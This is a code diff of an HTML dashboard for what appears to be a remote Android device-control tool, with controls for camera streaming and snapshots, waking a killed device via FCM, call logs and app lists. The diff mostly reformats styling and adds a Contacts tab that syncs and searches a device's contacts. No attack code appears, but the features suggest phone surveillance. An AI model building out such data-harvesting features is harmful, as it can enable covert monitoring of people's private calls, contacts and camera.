@@ -71,7 +71,6 @@
 
         h1, h2, h3, h4 { font-weight: 700; letter-spacing: -0.02em; }
 
-        /* ── Top Navigation Header ─────────────────────────────── */
         .nav-header {
             padding: 16px 32px;
             display: flex;
@@ -116,7 +115,6 @@
             flex-wrap: wrap;
         }
 
-        /* ── Device Selector (NEW) ────────────────────────────── */
         .device-selector-wrap {
             display: flex;
             align-items: center;
@@ -134,11 +132,7 @@
             box-shadow: 0 0 22px rgba(0, 240, 255, 0.22);
         }
 
-        .device-selector-icon {
-            width: 14px; height: 14px;
-            stroke: var(--primary);
-            flex-shrink: 0;
-        }
+        .device-selector-icon { width: 14px; height: 14px; stroke: var(--primary); flex-shrink: 0; }
 
         .device-selector {
             background: transparent;
@@ -160,12 +154,7 @@
         }
 
         .device-selector:disabled { opacity: 0.5; cursor: not-allowed; }
-
-        .device-selector option {
-            background: #0d1120;
-            color: var(--text-main);
-            font-family: var(--font-main);
-        }
+        .device-selector option { background: #0d1120; color: var(--text-main); font-family: var(--font-main); }
 
         .device-count {
             background: var(--primary);
@@ -228,30 +217,21 @@
             border-color: var(--success-glow);
             color: var(--success);
         }
-        .btn-control.start:hover:not(:disabled) {
-            background: rgba(16, 185, 129, 0.2);
-            box-shadow: 0 0 15px var(--success-glow);
-        }
+        .btn-control.start:hover:not(:disabled) { background: rgba(16, 185, 129, 0.2); box-shadow: 0 0 15px var(--success-glow); }
 
         .btn-control.stop {
             background: rgba(239, 68, 68, 0.1);
             border-color: var(--danger-glow);
             color: var(--danger);
         }
-        .btn-control.stop:hover:not(:disabled) {
-            background: rgba(239, 68, 68, 0.2);
-            box-shadow: 0 0 15px var(--danger-glow);
-        }
+        .btn-control.stop:hover:not(:disabled) { background: rgba(239, 68, 68, 0.2); box-shadow: 0 0 15px var(--danger-glow); }
 
         .btn-control.revive {
             background: rgba(245, 158, 11, 0.1);
             border-color: var(--warning-glow);
             color: var(--warning);
         }
-        .btn-control.revive:hover:not(:disabled) {
-            background: rgba(245, 158, 11, 0.2);
-            box-shadow: 0 0 15px var(--warning-glow);
-        }
+        .btn-control.revive:hover:not(:disabled) { background: rgba(245, 158, 11, 0.2); box-shadow: 0 0 15px var(--warning-glow); }
 
         .dashboard-container {
             display: grid;
@@ -330,11 +310,11 @@
         }
 
         .video-wrapper video {
-    width: 100%;
-    height: 100%;
-    object-fit: contain;
-    background: #000;
-}
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+            background: #000;
+        }
 
         .tab-card { display: flex; flex-direction: column; height: 380px; }
 
@@ -627,7 +607,6 @@
 </head>
 <body>
 
-    <!-- Top Navigation Header -->
     <header class="nav-header">
         <div class="nav-logo">
             <div class="nav-logo-orb"></div>
@@ -635,7 +614,6 @@
         </div>
         <div class="nav-status">
 
-            <!-- ─── Device Selector (NEW) ─────────────────────── -->
             <div class="device-selector-wrap" title="Active device selection">
                 <svg class="device-selector-icon" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2.5" stroke="currentColor">
                     <path stroke-linecap="round" stroke-linejoin="round" d="M10.5 1.5H8.25A2.25 2.25 0 006 3.75v16.5a2.25 2.25 0 002.25 2.25h7.5A2.25 2.25 0 0018 20.25V3.75a2.25 2.25 0 00-2.25-2.25H13.5m-3 0V3h3V1.5m-3 0h3m-3 18.75h3"/>
@@ -646,7 +624,6 @@
                 <span id="deviceCount" class="device-count">0</span>
             </div>
 
-            <!-- ─── Stream Controls ───────────────────────────── -->
             <button id="btnStartStream" class="btn-control start" title="Start streaming on the selected device" disabled>▶ Start Streaming</button>
             <button id="btnStopStream" class="btn-control stop" title="Stop streaming on the selected device" disabled>■ Stop Streaming</button>
             <button id="btnRevive" class="btn-control revive" title="Wake up the selected device via FCM if killed" disabled>⚡ Revive Device</button>
@@ -657,7 +634,6 @@
         </div>
     </header>
 
-    <!-- Main Workspace -->
     <main class="dashboard-container">
         
         <aside class="sidebar">
@@ -759,6 +735,7 @@
                 <div class="tab-header">
                     <button id="tabCalls" class="tab-btn active">Call Logs</button>
                     <button id="tabApps" class="tab-btn">Applications</button>
+                    <button id="tabContacts" class="tab-btn">Contacts</button>
                 </div>
 
                 <div id="paneCalls" class="tab-content">
@@ -775,6 +752,18 @@
                     <div id="appList" style="flex: 1; overflow-y: auto; scrollbar-width: thin;">
                         <div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">
                             No applications profiles synchronized yet. Click sync.
+                        </div>
+                    </div>
+                </div>
+
+                <div id="paneContacts" class="tab-content" style="display:none; flex-direction: column; height: 100%;">
+                    <div style="margin-bottom: 12px; display: flex; gap: 8px;">
+                        <input type="text" id="contactSearchInput" class="explorer-input" placeholder="Search contacts by name or number..." style="padding: 8px 14px; font-family: var(--font-main);">
+                        <button id="btnRefreshContacts" class="btn-explorer btn-primary" style="padding: 8px 14px; border-radius: 12px; font-size: 0.8rem; box-shadow: none;">Sync</button>
+                    </div>
+                    <div id="contactList" style="flex: 1; overflow-y: auto; scrollbar-width: thin;">
+                        <div style="color: var(--text-muted); text-align: center; margin-top: 30px; font-size: 0.85rem;">
+                            No contacts synchronized yet. Click sync.
                         </div>
                     </div>
                 </div>
@@ -827,7 +816,6 @@
         </article>
     </main>
 
-    <!-- Snapshot Modal -->
     <div id="snapshotModal" class="dialog-overlay">
         <div class="glass-panel dialog-box" style="max-width: 500px; width: 90%;">
             <h3 class="dialog-title">Camera Snapshot</h3>
@@ -841,7 +829,6 @@
         </div>
     </div>
 
-    <!-- Preview Modal -->
     <div id="previewModal" class="dialog-overlay">
         <div class="glass-panel dialog-box" style="max-width: 90vw; width: 90vw; max-height: 92vh; padding: 20px; display: flex; flex-direction: column;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; flex-shrink: 0;">
@@ -853,7 +840,6 @@
         </div>
     </div>
 
-    <!-- Generic Dialog -->
     <div id="dialogOverlay" class="dialog-overlay">
         <div class="glass-panel dialog-box">
             <h3 id="dialogTitle" class="dialog-title">Modal Title</h3>
